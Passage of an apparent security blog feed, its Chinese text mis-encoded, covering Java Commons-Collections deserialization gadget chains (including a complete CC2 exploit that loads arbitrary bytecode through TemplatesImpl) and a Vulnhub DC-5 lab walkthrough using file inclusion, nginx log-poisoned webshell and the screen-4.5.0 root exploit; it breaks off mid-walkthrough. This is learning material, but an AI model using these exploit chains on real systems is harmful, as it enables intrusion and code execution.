class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField.set(badAttributeValueExpException,tiedMapEntry);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(badAttributeValueExpException);  </span></span><br><span class="line">      unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091345852.png" alt="image-20230709134507676"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091348858.png" alt="image-20230709134826810"><br>ç­‰æŠŠCCç³»åˆ—å¼„å®Œäº†å†æŠŠè¿™ä¸ªæµç¨‹å›¾å¥½å¥½å¼„å¼„ï¼Œç›¸å½“äºæ€»ç»“ä¸€éäº†</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾2</title>
      <link href="/undefined/45207.html"/>
      <url>/undefined/45207.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>å’ŒCC4ä¸€æ ·ï¼ŒCommons-Collections ä¾èµ–å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>CC2å…¶å®å°±æ˜¯åœ¨CC4ä¸Šä¿®æ”¹ï¼Œå®ƒæ˜¯ä¸ºäº†é¿å…<code>transform</code>æ•°ç»„çš„ä½¿ç”¨ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦é¿å…æ˜¯å› ä¸ºshiroä¸­çš„æ¼æ´ä¼šé‡å†™å¾ˆå¤šåŠ¨æ€åŠ è½½æ•°ç»„çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå¯èƒ½EXP æ— æ³•é€šè¿‡æ•°ç»„å®ç°ï¼Œå½“ç„¶æˆ‘è¿˜æ²¡è·Ÿè¿‡shiroçš„é“¾å­åˆ°æ—¶å€™å†å»å­¦ä¹ ï¼Œé‚£ä¹ˆåˆ°è¿™é‡Œåé¢çš„æµç¨‹å›¾å°±å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951430.png" alt="image-20230706195111859"><br>å‰é¢çš„å°±æ˜¯CC4çš„ä¸œè¥¿ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯è¦æŠŠ<code>compare</code>ä¸<code>InvokerTransform</code>è¿æ¥èµ·æ¥ç„¶åå†æŠŠ<code>InvokerTransform</code>ä¸<code>TemplatesImpl</code>è¿æ¥èµ·æ¥å°±OKäº†ï¼Œé‚£ä¹ˆè¿™é‡Œå…ˆæŠŠåé¢çš„è§£å†³ç›´æ¥æŠŠCC4çš„æ‹¿è¿‡æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">Class tclass = templates.getClass();  </span><br><span class="line">Field nameField = tclass.getDeclaredField(&quot;_name&quot;);  </span><br><span class="line">nameField.setAccessible(true);  </span><br><span class="line">nameField.set(templates,&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">Field bytecodes = tclass.getDeclaredField(&quot;_bytecodes&quot;);  </span><br><span class="line">bytecodes.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E://java-tools/test.class&quot;));  </span><br><span class="line">byte[][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodes.set(templates,codes);</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ <code>InvokerTransformer</code>ç±»å»è°ƒç”¨<code>TemplatesImpl.newTransformer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è®©<code>TransformingComparator.compare()</code>å’Œ<code>InvokerTransformer</code>è¿æ¥èµ·æ¥ï¼Œå½“ç„¶è¿™é‡Œå’ŒCC4ä¸€æ ·ä¸ºäº†é¿å…<code>priorityQueue.add()</code>æå‰æ‰§è¡Œ<code>compare()</code>æ–¹æ³•ï¼Œæ‰€ä»¥ä»£ç ä¹Ÿä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ›å»º PriorityQueue ç±»å¯¹è±¡ ä¼ å…¥ <code>transformingComparator</code>çš„å¯¹è±¡ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å‘é˜Ÿåˆ—é‡Œé¢æ·»åŠ çš„å…ƒç´ æ˜¯å‰â¾¯åˆ›å»ºçš„ <code>TemplatesImpl</code>çš„å¯¹è±¡ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯æ·»åŠ åœ¨é˜Ÿåˆ—ç¬¬ä¸€ä¸ªå…ƒç´ ä½ç½®å› ä¸ºæœ€åè°ƒç”¨ <code>PriorityQueue.compare()</code> çš„æ—¶å€™æ˜¯ä¼ å…¥é˜Ÿåˆ—ä¸­çš„ä¸¤ä¸ªå¯¹è±¡ï¼Œç„¶å <code>compare()</code> ä¸­è°ƒç”¨ <code>Transformer.transform(obj1)</code> çš„æ—¶å€™ç”¨çš„æ˜¯ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹å³å¯çŸ¥é“<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951082.png" alt="image-20230706195150985"><br>å½“ç„¶ä¸¤ä¸ªéƒ½è®¾ç½®ä¸º<code>TemplatesImpl</code>çš„å¯¹è±¡ä¹Ÿæ²¡å…³ç³»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">priorityQueue.add(templates);  </span><br><span class="line">priorityQueue.add(templates);</span><br></pre></td></tr></table></figure><p>ç„¶ååˆå’ŒCC4ä¸€æ ·äº†åå°„æ”¹å›æ¥å°±è¡Œï¼Œç„¶åæŠŠ<code>chainedTransformer</code>æ”¹ä¸º<code>invokerTransformer</code>å› ä¸ºæˆ‘ä»¬æ˜¯ç›´æ¥è¿æ¥çš„InvokerTransformç±»çš„<code>transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">transformField.set(transformingComparator, invokerTransformer);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåˆ°è¿™é‡ŒCC2ä¹Ÿå°±ç»“æŸäº†ï¼Œæœ€ç»ˆçš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, invokerTransformer);  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952596.png" alt="image-20230706195209452"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p>è¿™æ¬¡æµç¨‹å›¾è¿˜æ˜¯ç›´æ¥åœ¨å‰é¢çš„åŸºç¡€ä¸Šæ”¹çš„ï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952237.png" alt="image-20230706195223181"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-5</title>
      <link href="/undefined/18667.html"/>
      <url>/undefined/18667.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-5.zip">https://download.vulnhub.com/dc/DC-5.zip</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>å¸¸è§„æ“ä½œå­˜æ´»IPæ‰«æ<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061520919.png" alt="image-20230706151759773"><br>ç«¯å£å¼€æ”¾æ‰«æ<code>nmap -A -p- 192.168.75.138</code>å¾—å…¨ç«¯å£æ‰«æä¸ç„¶åé¢é‚£ä¸ªæ‰«ä¸å‡ºæ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521447.png" alt="image-20230706152121358"><br>é¡µé¢çš„æ¡†æ¡†æµ‹äº†ä¸€ä¸‹æ²¡å•¥ä¸œè¥¿ï¼Œåœ¨æˆ‘æ¥å›è·³è½¬çš„æ—¶å€™çœ‹åˆ°å¦‚ä¸‹ä½ç½®ä¼šå‘ç”Ÿå˜åŒ–<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521465.png" alt="image-20230706152129436"><br>çŒœæµ‹å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œdirsearchæ‰«æä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521542.png" alt="image-20230706152137505"><br>è®¿é—®footer.phpåˆ·æ–°å‘ç°å¹´ä»½å˜åŒ–ï¼Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521344.png" alt="image-20230706152148309"><br>è€Œthankyou.phpé¡µé¢åˆ·æ–°ä¹Ÿå­˜åœ¨å˜åŒ–ï¼Œç¡®è®¤è¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«fuzzä¸€ä¸‹å‚æ•°æœ¬æ¥æƒ³ç”¨wfuzzæ¥fuzzå‚æ•°çš„ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´404æ— å¥ˆåªèƒ½æå‡ºæˆ‘çè—å¤šå¹´çš„å­—å…¸äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523186.png" alt="image-20230706152313122"><br>å¾—åˆ°å‚æ•°ä¸ºfileï¼Œä»æ’ä»¶ä¸­å¾—åˆ°æœåŠ¡ä¸ºnginxé‚£ä¹ˆå¯ä»¥å°è¯•åˆ©ç”¨æ—¥å¿—å†™é©¬ï¼Œè®¿é—®æ—¥å¿—ä¸»è¦è®°å½•å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å®¢æˆ·ç«¯å‘NginxæœåŠ¡å™¨å‘èµ·çš„æ¯ä¸€æ¬¡è¯·æ±‚éƒ½è®°å½•åœ¨è¿™é‡Œã€‚å®¢æˆ·ç«¯IPï¼Œæµè§ˆå™¨ä¿¡æ¯ï¼Œrefererï¼Œè¯·æ±‚å¤„ç†æ—¶é—´ï¼Œè¯·æ±‚URLç­‰éƒ½å¯ä»¥åœ¨è®¿é—®æ—¥å¿—ä¸­å¾—åˆ°ã€‚<br>é€šè¿‡fuzzå¾—åˆ°æ—¥å¿—è·¯å¾„å¦‚ä¸‹ï¼Œå½“ç„¶è¿™é‡Œæ˜¯é»˜è®¤çš„ç›´æ¥è®¿é—®å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell"><a href="#é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell" class="headerlink" title="é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell"></a>é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell</h2><p>ç„¶åå°è¯•å†™å…¥ç‚¹ä¸œè¥¿<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061549253.png" alt="image-20230706152333451">å‘ç°å†™å…¥æˆåŠŸ<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523970.png" alt="image-20230706152340900"></p><p>é‚£ä¹ˆç›´æ¥å†™é©¬è¿›å»ï¼Œè¿™é‡Œä¸€å¼€å§‹æ­»æ´»å†™ä¸ä¸Šåé¢é‡æ–°ä¸‹è½½äº†ä¸€ä¸‹é¶æœºæ‰å†™ä¸Šå¥‡å¥‡æ€ªæ€ª<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061552343.png" alt="image-20230706155159016"></p><p>è¿™æ ·å°±å†™å…¥æˆåŠŸäº†ï¼Œç„¶åå†å»åŒ…å«ä¸€ä¸‹æ—¥å¿—å³å¯çœ‹åˆ°ï¼Œä¸‹å›¾ç¬¬ä¸€ä¸ªæ˜¯æˆ‘ç›´æ¥ç”¨hackbarå‘åŒ…å†™çš„ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ—¥å¿—ä¸Šç›´æ¥æ˜¾ç¤ºäº†é©¬ï¼Œä½†æ˜¯é‚£ä¸ªè¢«è½¬ä¹‰äº†å®æµ‹è¿ä¸ä¸Šï¼Œåé¢ä¸€ä¸ªæ˜¯æˆ‘ç”¨bpå‘åŒ…å†™çš„è™½ç„¶çœ‹ä¸åˆ°é©¬ä½†æ˜¯å®é™…ä¸Šå·²ç»å†™è¿›å»äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524113.png" alt="image-20230706152416061"><br>ç„¶åèšå‰‘è¿æ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524932.png" alt="image-20230706152425898"><br>ä¸ºwww-dataæƒé™ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯ææƒäº†</p><h2 id="screenææƒ"><a href="#screenææƒ" class="headerlink" title="screenææƒ"></a>screenææƒ</h2><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å“ªäº›å‘½ä»¤å…·æœ‰suidæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524909.png" alt="image-20230706152437869"><br>æœ‰ä¸ªeximåœ¨dc-4ä¸­ä¸å°±æ˜¯ç”¨è¿™ä¸ªææƒçš„å—ä¸çŸ¥é“è¿™é‡Œå¯ä¸å¯ä»¥ï¼Œä¸è¿‡è¿™é‡Œå…ˆä¸ç®¡å¾…ä¼šå„¿å†çœ‹ï¼Œè¿™é‡Œå…ˆçœ‹<code>screen-4.5.0</code>åœ¨msfä¸Šæœä¸€ä¸‹ç›¸å…³æ¼æ´ï¼Œæ‰¾åˆ°ä¹‹åæ‰§è¡Œå¦‚ä¸‹æ“ä½œæŠŠexpæ‹·ä¸‹æ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524427.png" alt="image-20230706152458317"><br>ç„¶åæ ¹æ®expæç¤ºå°†å¦‚ä¸‹ä»£ç å•ç‹¬ä¿å­˜ä¸º<code>libhax.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525991.png" alt="image-20230706152507960"><br>ç„¶ågccç¼–è¯‘å®ƒå¾—åˆ°soæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so  libhax.c</span><br></pre></td></tr></table></figure><p>ç„¶åå†å°†å¦‚ä¸‹ä»£ç ä¿å­˜ä¸º<code>rootshell.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525278.png"><br>ç„¶åä¹Ÿæ˜¯gccç¼–è¯‘å¾—åˆ°rootshellï¼Œè¿™é‡Œä¸€å®šè¦æ³¨æ„è‡ªå·±æ”»å‡»æœºçš„glibcçš„ç‰ˆæœ¬ä¸ç„¶åé¢ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>ç„¶åå°†å‰©ä¸‹çš„å‘½ä»¤éƒ¨åˆ†ä¿å­˜ä¸º<code>dc5.sh</code>å¤´éƒ¨åŠ ä¸Š#!&#x2F;bin&#x2F;bashé˜²æ­¢ä¹±ç <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525981.png" alt="image-20230706152533941"><br>ç„¶åç”¨vimç¼–è¾‘å®ƒï¼Œä½¿ç”¨<code>:set ff=unix</code>æ¥ä¿å­˜<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525014.png" alt="image-20230706152547920"><br>ç„¶åæŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºçš„tmpç›®å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526339.png" alt="image-20230706152608276"><br>ç»™<code>dc5.sh</code>èµ‹æ‰§è¡Œæƒé™åæ‰§è¡Œï¼Œè¿™é‡Œç”±äºæˆ‘å‡ºäº†é—®é¢˜æ‰€ä»¥æœ€åå¼¹äº†shellæ‰§è¡Œçš„<code>run.sh</code>å½“ç„¶è¿™é‡Œæ–‡ä»¶åä¸é‡è¦éšä¾¿å°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526044.png" alt="image-20230706152624999"><br>è¿™é‡ŒæŠ¥é”™äº†ï¼Œä¸€ç›´æ²¡æœ‰çœ‹æŠ¥é”™çš„ä¹ 